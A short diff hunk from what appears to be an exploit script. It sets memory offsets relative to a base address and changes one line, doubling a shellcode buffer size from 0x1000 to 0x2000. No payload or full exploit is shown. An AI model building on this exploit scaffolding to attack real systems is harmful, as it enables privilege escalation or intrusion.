@@ -18,7 +18,7 @@ cache_func = base + 0x31444
 
 test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
 
-shellcode_sz = 0x1000 # TODO: check size
+shellcode_sz = 0x2000 # TODO: check size
 
 lk_offset = base - forced_addr
 
